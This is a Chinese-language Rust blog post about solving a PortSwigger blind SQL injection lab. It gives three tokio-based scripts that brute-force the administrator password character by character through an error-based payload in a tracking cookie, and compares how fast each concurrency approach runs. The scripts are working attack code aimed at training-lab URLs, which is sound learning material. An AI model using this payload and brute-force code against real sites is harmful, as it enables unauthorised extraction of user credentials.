---
title: "Rust笔记----rust并发小实践SQL注入爆破密码"
date: 2023-09-18T13:33:18+08:00
tags: ["tokio"]
categories: ["Rust"]
keywords: ["tokio","rust并发编程", "tokio实践", "rust并发实践"]
draft: false
---


在一个SQL注入的练习中，需要写一个脚本来获取administrator用户的密码，通过前期的处理，已经知道了密码的位数是20，密码包含0-9，a-z字符，注入的payload是：
`TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
这个注入的位置是在cookie中，这里的SQL注入利用的是，如果`SUBSTR(password,1,1)='a'` 密码的对应的每一位如果是对的，该请求就会返回http 500，否则返回http 200。
所以这里就需要从`SUBSTR(password,1,1)`， `SUBSTR(password,2,1)`....`SUBSTR(password,20,1)`,依次进行判断。

题目链接：<https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors>

## 第一个版本

这个版本的代码是比较tokio的最简单的应用，通过两层循环一个一个判断处理，爆破密码花费了343秒(不同电脑可能存在差异)

```rust
use reqwest::{header::HeaderMap, Client};
use tokio::time::Instant;

const URL: &'static str = "https://0a1700d60435cf9280aef40d00c80023.web-security-academy.net/login";
const MAX_NUM: i32 = 20;

type Error = Box<dyn std::error::Error + Send + Sync>;
type Result<T> = std::result::Result<T, Error>;

fn get_payload() -> Vec<String> {
    let res = ('a'..='z')
        .chain('0'..='9')
        .map(|b| b.to_string())
        .collect::<Vec<_>>();
    res
}

async fn send_payload(i: i32, j: String) -> Result<String> {
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;
    let mut headers = HeaderMap::new();
    let v = format!("TrackingId=HQzSS9kOLVoyj9Yh'||(SELECT CASE WHEN SUBSTR(password,{},1)='{}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||';",i,j);
    headers.insert("Cookie", v.parse().unwrap());
    let status_code = client.get(URL).headers(headers).send().await?.status();
    if status_code == reqwest::StatusCode::INTERNAL_SERVER_ERROR {
        return Ok(j);
    }
    return Err("not found".into());
}

#[tokio::main]
async fn main() -> Result<()> {
    let start = Instant::now();
    let payload = get_payload();
    let mut password = "".to_string();
    for i in 1..=MAX_NUM {
        for j in payload.iter() {
            let result = send_payload(i, j.to_string()).await;
            match result {
                Ok(s) => {
                    password += &s;
                    break;
                }
                Err(_) => {
                    continue;
                }
            }
        }
    }
    println!("use time {}", start.elapsed().as_secs());
    println!("{}", password);
    Ok(())
}

```

## 第二个版本

在这个版本中用到了 tokio task 的 `JoinSet`, 之前的笔记说过，`tokio::task::JoinSet`用于收集一系列异步任务，并判断它们是否终止。这个场景其实比较符合我们这个脚本的情况，我们对于密码的每一位的判断，都需要循环从a-z，0-9依次看请求是否会返回500来判断是否猜对，其实这个循环可以并发请求，只要有一个请求返回了500错误我们就终止其他的所有请求。
所以这个代码，我们在每次循环判断字符前，加了 `let mut set = JoinSet::new();`,然后在loop循环中通过 `set.join_next().await;` 不断获取task的结果，如果获取道了字符串，则执行`set.abort_all();` 其他所有任务，然后开始密码下一位的判断。
这一版本的代码，花费了40秒爆破到密码。

```rust
use reqwest::{header::HeaderMap, Client};
use tokio::{task::JoinSet, time::Instant};

const URL: &'static str = "https://0adc005c03bbc2b38098034c00cc001b.web-security-academy.net/login";
const MAX_NUM: i32 = 20;

type Error = Box<dyn std::error::Error + Send + Sync>;
type Result<T> = std::result::Result<T, Error>;

fn get_payload() -> Vec<String> {
    let res = ('a'..='z')
        .chain('0'..='9')
        .map(|b| b.to_string())
        .collect::<Vec<_>>();
    res
}

async fn send_payload(i: i32, j: String) -> Result<String> {
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;
    let mut headers = HeaderMap::new();
    let v = format!("TrackingId=wQfcURjPwR0HUwUx'||(SELECT CASE WHEN SUBSTR(password,{},1)='{}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||';",i,j);
    headers.insert("Cookie", v.parse().unwrap());
    let status_code = client.get(URL).headers(headers).send().await?.status();
    if status_code == reqwest::StatusCode::INTERNAL_SERVER_ERROR {
        return Ok(j);
    }
    return Err("not found".into());
}

#[tokio::main]
async fn main() -> Result<()> {
    let start = Instant::now();
    let payload = get_payload();
    let mut password = "".to_string();
    for i in 1..=MAX_NUM {
        let mut set = JoinSet::new();
        for j in payload.iter() {
            set.spawn(send_payload(i.clone(), j.to_owned()));
        }
        loop {
            let task_result = set.join_next().await;
            match task_result {
                Some(v) => match v? {
                    Ok(result) => {
                        password += &result;
                        set.abort_all();
                        break;
                    }
                    Err(_) => {
                        continue;
                    }
                },
                None => {
                    continue;
                }
            }
        }
    }
    println!("use time {}", start.elapsed().as_secs());
    println!("{}", password);
    Ok(())
}
```

## 第三个版本

在这个版本中使用了futures库的join_all方法，本以为这种方法会比第二个版本的速度更快一点，不过最终爆破密码花费了90秒左右

```rust
use futures::future::join_all;
use reqwest::{header::HeaderMap, Client};
use tokio::{task::JoinSet, time::Instant};

const URL: &'static str = "https://0a25006d03b8fc6c80420848005800b6.web-security-academy.net/login";
const MAX_NUM: i32 = 20;

type Error = Box<dyn std::error::Error + Send + Sync>;
type Result<T> = std::result::Result<T, Error>;

fn get_payload() -> Vec<String> {
    let res = ('a'..='z')
        .chain('0'..='9')
        .map(|b| b.to_string())
        .collect::<Vec<_>>();
    res
}

async fn send_payload(i: i32, j: String) -> Result<String> {
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;
    let mut headers = HeaderMap::new();
    let v = format!("TrackingId=123'||(SELECT CASE WHEN SUBSTR(password,{},1)='{}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||';",i,j);
    headers.insert("Cookie", v.parse().unwrap());
    let status_code = client.get(URL).headers(headers).send().await?.status();
    if status_code == reqwest::StatusCode::INTERNAL_SERVER_ERROR {
        return Ok(j);
    }
    return Err("not found".into());
}

async fn batch_send(i: i32, payload: &Vec<String>) -> Result<String> {
    let mut set = JoinSet::new();
    for j in payload.iter() {
        set.spawn(send_payload(i.clone(), j.to_owned()));
    }
    loop {
        let task_result = set.join_next().await;
        match task_result {
            Some(v) => match v? {
                Ok(result) => {
                    set.abort_all();
                    return Ok(result);
                }
                Err(_) => {
                    continue;
                }
            },
            None => {
                continue;
            }
        }
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    let start = Instant::now();
    let payload = get_payload();
    let mut tasks = vec![];
    for i in 1..=MAX_NUM {
        tasks.push(batch_send(i, &payload))
    }
    let result = join_all(tasks).await;
    let password = result
        .into_iter()
        .filter_map(|r| r.ok())
        .collect::<Vec<String>>()
        .join("");
    println!("use time {}", start.elapsed().as_secs());
    println!("{}", password);
    Ok(())
}

```

## 小结

本以为第三个方法会比第二个方法快很多，但是却慢了，当然可以能是自己刚了解rust 并发使用的问题，后续会通过不断测试来代码深入学习rust 并发编程。
